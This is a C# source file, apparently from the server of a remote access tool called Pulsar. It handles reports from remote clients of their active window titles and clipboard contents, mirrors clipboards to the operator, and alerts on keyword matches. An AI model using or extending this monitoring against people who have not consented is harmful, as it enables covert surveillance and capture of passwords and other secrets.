using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Server.Forms;
using Pulsar.Server.Helper;
using Pulsar.Server.Networking;
using System;
using System.IO;
using System.Linq;
using System.Threading;
using Newtonsoft.Json;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;

namespace Pulsar.Server.Messages
{
    /// <summary>
    /// Handles messages for the interaction with the remote client status.
    /// </summary>
    public class ClientStatusHandler : MessageProcessorBase<object>
    {
        /// <summary>
        /// Represents the method that will handle status updates.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="client">The client which updated the status.</param>
        /// <param name="statusMessage">The new status.</param>
        public delegate void StatusUpdatedEventHandler(object sender, Client client, string statusMessage);

        /// <summary>
        /// Represents the method that will handle user status updates.
        /// </summary>
        /// <param name="sender">The message handler which raised the event.</param>
        /// <param name="client">The client which updated the user status.</param>
        /// <param name="userStatusMessage">The new user status.</param>
        public delegate void UserStatusUpdatedEventHandler(object sender, Client client, UserStatus userStatusMessage);

        public delegate void UserActiveWindowStatusUpdatedEventHandler(object sender, Client client, string newWindow);

        public delegate void UserClipboardStatusUpdatedEventHandler(object sender, Client client, string clipboardText);

        /// <summary>
        /// Raised when a client updated its status.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the 
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event StatusUpdatedEventHandler StatusUpdated;

        /// <summary>
        /// Raised when a client updated its user status.
        /// </summary>
        /// <remarks>
        /// Handlers registered with this event will be invoked on the 
        /// <see cref="System.Threading.SynchronizationContext"/> chosen when the instance was constructed.
        /// </remarks>
        public event UserStatusUpdatedEventHandler UserStatusUpdated;

        public event UserActiveWindowStatusUpdatedEventHandler UserActiveWindowStatusUpdated;

        public event UserClipboardStatusUpdatedEventHandler UserClipboardStatusUpdated;

        /// <summary>
        /// Reports an updated status.
        /// </summary>
        /// <param name="client">The client which updated the status.</param>
        /// <param name="statusMessage">The new status.</param>
        private void OnStatusUpdated(Client client, string statusMessage)
        {
            SynchronizationContext.Post(c =>
            {
                var handler = StatusUpdated;
                handler?.Invoke(this, (Client)c, statusMessage);
            }, client);
        }

        /// <summary>
        /// Reports an updated user status.
        /// </summary>
        /// <param name="client">The client which updated the user status.</param>
        /// <param name="userStatusMessage">The new user status.</param>
        private void OnUserStatusUpdated(Client client, UserStatus userStatusMessage)
        {
            SynchronizationContext.Post(c =>
            {
                var handler = UserStatusUpdated;
                handler?.Invoke(this, (Client)c, userStatusMessage);
            }, client);
        }        
        
        private void OnUserActiveWindowStatusUpdated(Client client, string newWindow)
        {
            SynchronizationContext.Post(c =>
            {
                var handler = UserActiveWindowStatusUpdated;
                handler?.Invoke(this, (Client)c, newWindow);
            }, client);
        }

        private void OnUserClipboardStatusUpdated(Client client, string clipboardText)
        {
            SynchronizationContext.Post(c =>
            {
                var handler = UserClipboardStatusUpdated;
                handler?.Invoke(this, (Client)c, clipboardText);
            }, client);
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="ClientStatusHandler"/> class.
        /// </summary>
        public ClientStatusHandler() : base(true)
        {
        }        
        
        /// <inheritdoc />
        public override bool CanExecute(IMessage message) => message is SetStatus || message is SetUserStatus || message is SetUserActiveWindowStatus || message is SetUserClipboardStatus;

        /// <inheritdoc />
        public override bool CanExecuteFrom(ISender sender) => true;        
        
        /// <inheritdoc />
        public override void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case SetStatus status:
                    Execute((Client)sender, status);
                    break;
                case SetUserStatus userStatus:
                    Execute((Client)sender, userStatus);
                    break;
                case SetUserActiveWindowStatus userActiveWindowStatus:
                    Execute((Client)sender, userActiveWindowStatus);
                    break;
                case SetUserClipboardStatus userClipboardStatus:
                    Execute((Client)sender, userClipboardStatus);
                    break;
            }
        }

        private void Execute(Client client, SetStatus message)
        {
            OnStatusUpdated(client, message.Message);
        }

        private void Execute(Client client, SetUserStatus message)
        {
            OnUserStatusUpdated(client, message.Message);
        }        
        
        private void Execute(Client client, SetUserActiveWindowStatus message)
        {
            OnUserActiveWindowStatusUpdated(client, message.WindowTitle);

            if (message.WindowTitle == null)
            {
                return;
            }

            Task.Run(() =>
            {
                string keywordsFilePath = Path.Combine(Application.StartupPath, "PulsarStuff", "keywords.json");
                
                if (File.Exists(keywordsFilePath))
                {
                    string jsonContent = File.ReadAllText(keywordsFilePath);
                    var keywords = JsonConvert.DeserializeObject<string[]>(jsonContent);

                    if (keywords != null)
                    {
                        var matchedKeyword = keywords.FirstOrDefault(keyword => message.WindowTitle.IndexOf(keyword, StringComparison.OrdinalIgnoreCase) >= 0);

                        if (matchedKeyword != null)
                        {
                            FrmMain frm = Application.OpenForms["FrmMain"] as FrmMain;
                            if (frm != null)
                            {
                                frm.Invoke(new Action(() =>
                                {
                                    FrmMain.AddNotiEvent(frm, client.Value.UserAtPc, "Keyword triggered: " + matchedKeyword, message.WindowTitle);
                                }));
                            }
                        }
                    }
                }
            });
        }

        private void Execute(Client client, SetUserClipboardStatus message)
        {
            OnUserClipboardStatusUpdated(client, message.ClipboardText);

            if (string.IsNullOrEmpty(message.ClipboardText))
            {
                return;
            }

            if (client.ClipboardSyncEnabled)
            {
                try
                {
                    Debug.WriteLine($"Server: Mirroring clipboard from client ({client.EndPoint}): {message.ClipboardText.Substring(0, Math.Min(20, message.ClipboardText.Length))}...");

                    ClipboardMonitor.NotifyReceivedFromClient(message.ClipboardText);

                    Thread clipboardThread = new Thread(() =>
                    {
                        try
                        {
                            Thread.CurrentThread.SetApartmentState(ApartmentState.STA);
                            Clipboard.SetText(message.ClipboardText);
                            Debug.WriteLine("Server: Successfully mirrored clipboard from client");
                        }
                        catch (Exception ex)
                        {
                            Debug.WriteLine($"Server: Error setting clipboard: {ex.Message}");
                        }
                    });
                    clipboardThread.SetApartmentState(ApartmentState.STA);
                    clipboardThread.Start();
                    clipboardThread.Join(1000);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Server: Error in clipboard thread creation: {ex.Message}");
                }
            }
            else
            {
                Debug.WriteLine("Server: Clipboard sync disabled for this client; skipping host clipboard update.");
            }

            Task.Run(() =>
            {
                string keywordsFilePath = Path.Combine(Directory.GetCurrentDirectory(), "keywords.json");

                if (File.Exists(keywordsFilePath))
                {
                    string jsonContent = File.ReadAllText(keywordsFilePath);
                    var keywords = JsonConvert.DeserializeObject<string[]>(jsonContent);

                    if (keywords != null)
                    {
                        var matchedKeyword = keywords.FirstOrDefault(keyword => message.ClipboardText.IndexOf(keyword, StringComparison.OrdinalIgnoreCase) >= 0);

                        if (matchedKeyword != null)
                        {
                            FrmMain frm = Application.OpenForms["FrmMain"] as FrmMain;
                            if (frm != null)
                            {
                                frm.Invoke(new Action(() =>
                                {
                                    FrmMain.AddNotiEvent(frm, client.Value.UserAtPc, "Keyword triggered (Clipboard): " + matchedKeyword, message.ClipboardText);
                                }));
                            }
                        }
                    }
                }
            });
        }
    }
}
